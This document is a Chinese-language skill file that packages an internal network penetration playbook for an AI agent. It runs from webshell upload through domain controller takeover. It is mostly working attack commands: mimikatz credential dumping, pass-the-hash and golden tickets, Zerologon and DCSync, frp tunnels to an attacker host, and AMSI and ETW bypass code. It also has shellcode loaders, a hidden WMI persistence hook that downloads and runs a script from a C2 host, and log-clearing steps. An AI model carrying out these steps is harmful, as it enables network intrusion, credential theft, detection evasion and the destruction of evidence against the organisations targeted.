---
name: internal-penetration
description: >-
  Internal network penetration testing playbook. Use when conducting complete penetration tests from external breakthrough to domain controller compromise, including information gathering, privilege escalation, lateral movement, and domain control.
---

# SKILL: 内网渗透实战全流程

## 1. 环境准备

### 典型企业内网架构

| 主机角色 | 操作系统 | IP地址 | 核心配置 | 作用 |
|---|---|---|---|---|
| 外网Web服务器 | Windows Server 2003 | 外网：192.168.1.101<br>内网：192.168.2.101 | Apache+PHP+MySQL | 外网突破口 |
| 内网办公机 | Windows 7 | 192.168.2.102 | 加入域（test.com） | 内网中间节点 |
| 域控制器 | Windows Server 2008 | 192.168.2.103 | Active Directory | 内网核心 |

### 网络配置注意事项
- 虚拟机使用"仅主机模式"或"自定义网络"
- 确保内网网段（192.168.2.0/24）互通
- Web服务器需双网卡：NAT模式（外网）+ 内网

## 2. 阶段1：外网突破 —— 拿下Web服务器

### 信息搜集

**端口扫描**：
```bash
nmap -sV -p 1-65535 192.168.1.101
```

**常见漏洞测试**：
- 文件上传漏洞
- SQL注入
- XSS
- 目录遍历

### 漏洞利用：上传WebShell

**制作图片马**：
```bash
copy /b test.jpg + shell.php shell.jpg.php
```

**绕过前端校验**：
1. 使用Burp Suite抓包拦截
2. 修改文件名或Content-Type
3. 上传成功后获取路径

**连接WebShell**：
- 使用中国蚁剑、冰蝎等工具
- URL：`http://192.168.1.101/uploads/shell.jpg.php`
- 密码：`pass`

### 权限提升

**内核漏洞提权（MS10-059）**：
```cmd
C:\Windows\Temp\ms10-059.exe -p cmd
```

**其他提权方法**：
- MS17-010（永恒之蓝）
- UAC绕过
- 服务权限漏洞

## 3. 阶段2：内网信息搜集

### 探测内网存活主机

```cmd
for /l %i in (1,1,254) do ping -n 1 192.168.2.%i | find "TTL=" >> C:\alive.txt
```

**查看存活主机**：
```cmd
type C:\alive.txt
```

### 使用Impacket探测内网

```bash
# 扫描内网SMB服务
python3 smbscan.py -target 192.168.2.0/24

# 扫描内网LDAP服务
python3 ldapsearch.py -target 192.168.2.0/24
```

### 抓取账号密码哈希

```cmd
cd C:\Windows\Temp
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\hash.txt
```

**哈希格式**：
```
admin:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
- 前半部分：LM哈希
- 后半部分：NTLM哈希

### 确认域信息

```cmd
net config workstation    # 查看是否加入域
net domain                # 查看域名称
nslookup test.com         # 解析域控IP
whoami /all               # 查看当前用户信息和SID
```

### 使用SharpHound收集AD信息

```powershell
# 基础收集
.\SharpHound.exe -c All

# 静默收集
.\SharpHound.exe -c All -d test.com --Stealth

# 收集到指定文件
.\SharpHound.exe -c All -o output.json
```

## 4. 阶段3：横向移动 —— 从Web服务器到内网办公机

### 哈希传递攻击（Pass-the-Hash）

```cmd
C:\Windows\Temp\psexec.exe \\192.168.2.102 -u test\admin -p 31d6cfe0d16ae931b73c59d7e0c089c0 -s cmd
```

**参数说明**：
- `\\192.168.2.102`：目标主机IP
- `-u test\admin`：域账号
- `-p`：NTLM哈希（无需明文密码）
- `-s`：以系统权限执行

**Impacket SMBExec**：
```bash
python3 smbexec.py test/admin@192.168.2.102 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

### 票据传递攻击（Pass-the-Ticket）

```cmd
# 获取票据
mimikatz.exe "kerberos::list" "exit"

# 注入票据
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

# 利用票据访问域控
psexec.exe \\dc.test.com -s cmd
```

### 其他横向移动方法

**WMI**：
```cmd
wmic /node:192.168.2.102 /user:test\admin /password:hash process call create "cmd.exe /c ipconfig > C:\result.txt"
```

**PowerShell远程执行**：
```powershell
Invoke-Command -ComputerName "192.168.2.102" -ScriptBlock { whoami }
```

**RDP**：
```cmd
mstsc.exe /v:192.168.2.102 /u:test\admin
```

## 5. 阶段4：拿下域控

### 使用Impacket工具集

```bash
# 获取TGT票据
python3 getTGT.py test.com/admin -dc-ip 192.168.2.103

# 使用票据获取域控权限
KRB5CCNAME=admin.ccache python3 smbexec.py -k -no-pass test.com/dc$@192.168.2.103
```

### 黄金票据攻击

**搜集所需信息**：

```cmd
whoami /all
nbtstat -A 192.168.2.103
mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "exit"
```

**生成黄金票据**：

```cmd
mimikatz.exe "kerberos::golden /user:Administrator /domain:test.com /sid:S-1-5-21-1234567890-123456789-1234567890 /krbtgt:88a4f40f50a96335564e1d465558dac9 /ticket:C:\golden.ticket" "exit"
```

**参数说明**：
- `/user:Administrator`：伪造的域管理员账号
- `/domain:test.com`：域名称
- `/sid`：域SID
- `/krbtgt`：krbtgt账号的NTLM哈希
- `/ticket`：生成的票据保存路径

**利用黄金票据**：

```cmd
mimikatz.exe "kerberos::ptt C:\golden.ticket" "exit"
psexec.exe \\192.168.2.103 -s cmd
```

### 白银票据攻击

```cmd
mimikatz.exe "kerberos::golden /user:Administrator /domain:test.com /sid:S-1-5-21-1234567890-123456789-1234567890 /target:dc.test.com /service:cifs /rc4:88a4f40f50a96335564e1d465558dac9 /ticket:C:\silver.ticket" "exit"
```

### 直接漏洞利用（Zerologon）

```bash
# 检测漏洞
python3 zerologon_tester.py dc.test.com 192.168.2.103

# 利用漏洞置空域控机器账号密码
python3 cve-2020-1472-exploit.py dc 192.168.2.103

# 获取域控权限
python3 secretsdump.py -just-dc -no-pass 'test.com/dc$@192.168.2.103'
```

### ADCS证书漏洞（Certipy）

```bash
# 扫描易受攻击的证书模板
certipy find -u admin@test.com -p password -dc-ip 192.168.2.103

# 请求证书
certipy req -u admin@test.com -p password -dc-ip 192.168.2.103 -target dc.test.com -template User

# 获取hash
certipy cert -pfx cert.pfx -dc-ip 192.168.2.103
```

## 6. 阶段5：导出域内所有凭据

### DCSync攻击

```cmd
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:test.com /user:krbtgt" "exit"
```

```bash
python3 secretsdump.py -just-dc user@dc.test.com
```

### 导出SAM和NTLM

```cmd
reg save HKLM\SAM C:\sam.save
reg save HKLM\SYSTEM C:\system.save
mimikatz.exe "lsadump::sam /sam:C:\sam.save /system:C:\system.save" "exit"
```

### 使用Impacket导出所有凭据

```bash
# 导出域内所有用户哈希
python3 secretsdump.py test.com/administrator:password@dc.test.com

# 仅导出DC哈希
python3 secretsdump.py -just-dc test.com/administrator:password@dc.test.com
```

## 7. 内网渗透实战建议

### 核心逻辑
```
突破 → 搜集 → 移动 → 控制
```

### 完整攻击链路

```
外网突破
  ├── WebShell上传
  ├── 权限提升（内核漏洞）
  └── 建立C2通道

内网搜集
  ├── 存活主机扫描
  ├── 凭据窃取（Mimikatz）
  ├── AD信息收集（SharpHound）
  └── BloodHound拓扑分析

横向移动
  ├── 哈希传递（PsExec/Impacket）
  ├── 票据传递（Pass-the-Ticket）
  ├── 端口转发/隧道
  └── PowerShell/WMI远程执行

域控突破
  ├── 直接漏洞利用（Zerologon/MS14-068/NoPac）
  ├── ADCS证书漏洞（Certipy）
  ├── ACL权限滥用（bloodyAD/ACLPwn）
  ├── Group Policy滥用（SharpGPOAbuse）
  ├── 黄金/白银票据攻击
  └── PetitPotam + NTLM中继

凭据导出
  ├── DCSync攻击
  ├── secretsdump导出哈希
  └── 域内权限维持
```

### 新手必避的坑

1. **杀软问题**：Windows Defender会查杀Mimikatz、PsExec等工具
2. **网络配置**：虚拟机必须在同一网段，Web服务器需双网卡
3. **明文密码**：企业内网通常禁止明文密码传输，使用哈希传递更贴近真实场景
4. **清理痕迹**：测试完成后删除上传的工具和日志文件
5. **循序渐进**：先练熟基础横向方法，再学高级技巧

### 工具包

**提权工具**：
- ms10-059.exe
- ms17-010.exe
- kernel exploit工具集

**横向移动工具**：
- mimikatz.exe
- psexec.exe
- Impacket（smbexec、wmiexec、psexec）
- cobalt strike

**域渗透工具**：
- BloodHound + SharpHound
- Certipy
- bloodyAD
- ACLPwn
- NoPac/sam-the-admin
- Zerologon EXP

**信息搜集工具**：
- nmap
- ping扫描脚本
- port扫描工具

### 防御建议

- **网络隔离**：划分安全区域，限制横向移动
- **强认证**：实施多因素认证
- **权限最小化**：限制用户权限范围
- **监控异常行为**：使用SIEM系统检测横向移动
- **定期审计**：定期检查系统安全配置
- **及时打补丁**：特别是域控相关漏洞

## 8. [补充推演] 代理隧道体系

### 隧道工具对比矩阵

| 工具 | 协议支持 | 特点 | 适用场景 |
|---|---|---|---|
| **frp** | TCP/UDP/HTTP | 配置简单、功能全面 | 通用内网穿透 |
| **nps** | TCP/UDP/HTTP/SOCKS | Web管理界面、多客户端 | 多级内网穿透 |
| **earthworm (ew)** | SOCKS5 | 轻量、多级代理 | 快速建立SOCKS代理 |
| **reGeorg** | HTTP | 通过WebShell建立隧道 | 仅开Web端口的环境 |
| **Neo-reGeorg** | HTTP | reGeorg增强版、加密传输 | 需加密的Web隧道 |
| **suo5** | HTTP | 高性能HTTP隧道 | 需要高吞吐的场景 |
| **Chisel** | TCP/UDP/HTTP/WS | 跨平台、加密传输 | 混合环境 |
| **Stowaway** | TCP/UDP | 多级代理、节点管理 | 复杂多级网络 |
| **iox** | TCP/UDP | 轻量、支持加密 | 快速端口转发 |

### frp内网穿透

**服务端配置（frps.ini）**：
```ini
[common]
bind_port = 7000
dashboard_port = 7500
dashboard_user = admin
dashboard_pwd = password
```

**客户端配置（frpc.ini）**：
```ini
[common]
server_addr = ATTACKER_IP
server_port = 7000

[socks5_proxy]
type = tcp
remote_port = 1080
plugin = socks5

[ssh_tunnel]
type = tcp
local_ip = 192.168.2.103
local_port = 22
remote_port = 2222

[rdp_tunnel]
type = tcp
local_ip = 192.168.2.103
local_port = 3389
remote_port = 3389
```

### earthworm多级代理

```bash
# 一级代理：Web服务器建立SOCKS
ew_for_Win.exe -s ssocksd -l 1080

# 二级代理：通过Web服务器代理到内网办公机
ew_for_Win.exe -s rssocks -g 192.168.2.101 -p 1080

# 三级代理：链式代理到域控网段
ew_for_Win.exe -s lcx_slave -d 192.168.2.101 -e 1080 -f 192.168.2.102 -g 1081
```

### reGeorg/Neo-reGeorg Web隧道

```bash
# 1. 上传tunnel.php到Web服务器
# 2. 建立隧道
python reGeorgSocksProxy.py -u http://192.168.1.101/tunnel.php -p 1080

# Neo-reGeorg（加密版）
# 生成加密隧道文件
neoreg.py generate -k password
# 上传生成的tunnel.php到目标
# 建立隧道
neoreg.py -k password -u http://192.168.1.101/tunnel.php
```

### 代理链使用

```bash
# 配置proxychains
# /etc/proxychains.conf
socks5 127.0.0.1 1080

# 通过代理执行命令
proxychains nmap -sV -p 445 192.168.2.0/24
proxychains python3 secretsdump.py -just-dc user@dc.test.com
proxychains crackmapexec smb 192.168.2.0/24 -u admin -p password
```

### 隧道选择决策树

```
目标环境
├── 有出网权限
│   ├── 直接回连C2 → frp/nps/chisel
│   └── 需SOCKS代理 → frp(socks5)/ew
├── 仅开Web端口（80/443）
│   ├── 有WebShell → reGeorg/Neo-reGeorg/suo5
│   └── 无WebShell → 先获取WebShell
├── 仅开DNS
│   ├── DNS隧道 → dnscat2/iodine
│   └── 需DNS服务器配合
├── 仅开ICMP
│   └── ICMP隧道 → icmpsh/pingtunnel
├── 完全不出网
│   ├── SMB隧道（Beacon间通信）→ Cobalt Strike SMB Beacon
│   ├── 命名管道通信 → 通过已有Beacon
│   └── 物理接触 → USB投放
└── 多级网络隔离
    ├── 多级SOCKS代理 → ew/stowaway
    └── 端口转发链 → iox/chisel
```

## 9. [补充推演] 免杀与AV对抗

### 免杀技术分类

| 类别 | 技术手段 | 检测对抗 | 适用场景 |
|---|---|---|---|
| 静态免杀 | 代码混淆/加密/加壳 | 绕过特征码扫描 | 初次投递 |
| 动态免杀 | 内存加载/分离执行 | 绕过行为检测 | 执行阶段 |
| 通信免杀 | 流量加密/协议伪装 | 绕过流量检测 | C2通信 |
| 行为免杀 | 进程注入/合法工具利用 | 绕过EDR行为分析 | 后渗透阶段 |

### 静态免杀

**Shellcode加密加载**：
```go
// XOR加密shellcode
func decryptShellcode(encrypted []byte, key byte) []byte {
    decrypted := make([]byte, len(encrypted))
    for i := 0; i < len(encrypted); i++ {
        decrypted[i] = encrypted[i] ^ key
    }
    return decrypted
}

// AES加密shellcode
func decryptAES(ciphertext []byte, key []byte) []byte {
    block, _ := aes.NewCipher(key)
    iv := ciphertext[:aes.BlockSize]
    plaintext := make([]byte, len(ciphertext)-aes.BlockSize)
    stream := cipher.NewCFBDecrypter(block, iv)
    stream.XORKeyStream(plaintext, ciphertext[aes.BlockSize:])
    return plaintext
}
```

**分离免杀**：
```
Loader.exe（白名单程序）→ 远程下载加密shellcode → 内存解密执行
不落地文件，避免静态查杀
```

### 动态免杀

**AMSI Bypass**：
```powershell
# AMSI内存补丁
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 或使用C#反射修改AMSI结果
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
```

**ETW Bypass**：
```csharp
// 修补ntdll!EtwEventWrite
foreach (ProcessModule module in Process.GetCurrentProcess().Modules) {
    if (module.ModuleName.ToLower() == "ntdll.dll") {
        IntPtr etwEventWrite = GetProcAddress(module.BaseAddress, "EtwEventWrite");
        VirtualProtect(etwEventWrite, (UIntPtr)1, 0x40, out uint oldProtect);
        Marshal.Copy(new byte[] { 0xc3 }, 0, etwEventWrite, 1);
        VirtualProtect(etwEventWrite, (UIntPtr)1, oldProtect, out _);
    }
}
```

**直接系统调用（Direct Syscalls）**：
```
绕过ntdll.dll的API Hook
直接通过syscall指令调用内核函数
工具：SysWhispers3, HellsGate, HalosGate
```

### 常见免杀工具

| 工具 | 语言 | 特点 |
|---|---|---|
| **GobypassAV-shellcode** | Go | 过国内杀软三剑客 |
| **shellcode_loader** | C/C++ | 多种加载方式 |
| **AV_Evasion_Tool** | C# | 图形化免杀工具 |
| **BypassAV** | Go/ShellCode | 多种加密方式 |
| **Msmap** | C | 内存映射加载 |

### 免杀效果验证

```
验证流程：
1. 本地杀软测试（360/火绒/Windows Defender）
2. 微步沙箱检测
3. VirusTotal检测（注意：上传VT后样本会被厂商收录）
4. 微步在线检测
5. 实际目标环境验证
```

## 10. [补充推演] 持久化机制

### Windows持久化技术矩阵

| 技术 | 位置 | 权限要求 | 隐蔽性 | 检测难度 |
|---|---|---|---|---|
| 注册表Run键 | HKLM/HKCU | User/Admin | 低 | 低 |
| 计划任务 | Task Scheduler | User/Admin | 中 | 中 |
| 服务 | services.msc | Admin | 低 | 低 |
| WMI事件订阅 | WMI | Admin | 高 | 高 |
| COM劫持 | 注册表CLSID | User | 高 | 高 |
| DLL劫持 | 应用程序目录 | User | 高 | 高 |
| 映像劫持（IFEO） | 注册表 | Admin | 中 | 中 |
| Logon Script | 组策略 | Admin | 中 | 中 |
| Shift后门 | sethc.exe | Admin | 低 | 低 |
| 隐藏用户 | 注册表/SAM | Admin | 中 | 中 |

### 高隐蔽性持久化

**WMI永久事件订阅**：
```powershell
# 创建事件过滤器
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SysmonUpdate"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"
}

# 创建事件消费者
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "SysmonUpdate"
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://c2/script.ps1')"
}

# 绑定过滤器和消费者
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

**COM劫持**：
```reg
# 修改InProcServer32指向恶意DLL
reg add "HKCU\Software\Classes\CLSID\{0CD7A5C0-2B5C-4E9C-B0A3-9E6A9B3C2F1D}\InProcServer32" /ve /t REG_SZ /d "C:\evil.dll" /f

# 持久化触发：explorer.exe启动时加载
```

### Linux持久化技术矩阵

| 技术 | 位置 | 权限要求 | 隐蔽性 |
|---|---|---|---|
| Crontab | /var/spool/cron/ | User | 低 |
| Systemd服务 | /etc/systemd/system/ | Root | 中 |
| SSH公钥 | ~/.ssh/authorized_keys | User | 中 |
| PAM后门 | /etc/pam.d/ | Root | 高 |
| 内核模块(LKM) | /lib/modules/ | Root | 高 |
| LD_PRELOAD | /etc/ld.so.preload | Root | 高 |
| Shell配置文件 | ~/.bashrc, ~/.profile | User | 低 |

### 持久化选择决策树

```
权限级别
├── 普通用户权限
│   ├── 注册表Run键（简单）
│   ├── 计划任务（常见）
│   ├── COM劫持（隐蔽）
│   └── DLL劫持（隐蔽）
├── 管理员权限
│   ├── 服务（稳定）
│   ├── WMI事件订阅（隐蔽）
│   ├── 映像劫持（IFEO）
│   └── 隐藏用户
└── SYSTEM/域管权限
    ├── 以上所有方法
    ├── Skeleton Key（域控）
    ├── 黄金票据（域控）
    ├── DSRM后门（域控）
    └── 组策略后门（域控）
```

## 11. [补充推演] 完整内网渗透决策树

```
初始突破
├── 外网漏洞利用
│   ├── Web漏洞（SQL注入/文件上传/RCE）
│   ├── 服务漏洞（MS17-010/Redis未授权）
│   ├── 弱口令爆破（SSH/RDP/MySQL）
│   └── 社会工程（钓鱼邮件/水坑攻击）
│
├── 建立立足点
│   ├── 上传WebShell
│   ├── 建立C2通道
│   ├── 权限提升（内核漏洞/配置错误）
│   └── 建立持久化
│
├── 内网信息搜集
│   ├── 存活主机扫描
│   ├── 端口服务扫描
│   ├── 域信息收集（BloodHound）
│   ├── 凭据窃取（Mimikatz）
│   └── 网络拓扑分析
│
├── 建立隧道/代理
│   ├── 有出网权限 → frp/nps/chisel
│   ├── 仅Web端口 → reGeorg/Neo-reGeorg
│   ├── 仅DNS → dnscat2/iodine
│   ├── 不出网 → SMB Beacon/端口转发
│   └── 多级隔离 → ew/stowaway多级代理
│
├── 横向移动
│   ├── 哈希传递（PsExec/Impacket）
│   ├── 票据传递（Pass-the-Ticket）
│   ├── CrackMapExec批量扫描
│   ├── evil-winrm/WinRM
│   ├── WMI/DCOM远程执行
│   └── RDP远程桌面
│
├── 域控突破
│   ├── 参见domain-penetration skill
│   ├── Zerologon/MS14-068/NoPac
│   ├── Kerberoasting/AS-REP Roasting
│   ├── 委派攻击/RBCD
│   ├── ADCS证书漏洞
│   ├── ACL权限滥用
│   └── 黄金/白银票据
│
├── 凭据导出
│   ├── DCSync
│   ├── NTDS.dit提取
│   ├── Mimikatz凭据窃取
│   └── secretsdump批量导出
│
├── 权限维持
│   ├── 黄金票据/Skeleton Key
│   ├── WMI事件订阅
│   ├── COM劫持
│   └── 隐藏账户
│
└── 痕迹清理
    ├── 清除Web日志
    ├── 清除系统日志
    ├── 删除上传工具
    ├── 清理持久化项
    └── 清除C2日志
```

## 12. [补充推演] 跨Skill协作关系

| 场景 | 本Skill提供 | 衔接Skill |
|---|---|---|
| C2通道建立 | 隧道选择、代理配置 | c2-remote-control |
| 横向移动技术 | PsExec/Impacket/CrackMapExec | pivoting-lateral-movement |
| 域控突破 | 域信息收集、攻击路径 | domain-penetration |
| 持久化维持 | 持久化技术矩阵 | c2-remote-control |
| 免杀对抗 | 免杀技术、AV绕过 | c2-remote-control |
| 痕迹清理与反取证 | 日志清理方法 | traceback-counterattack |
| 蜜罐识别 | 蜜罐检测技巧 | honeypot-counterattack |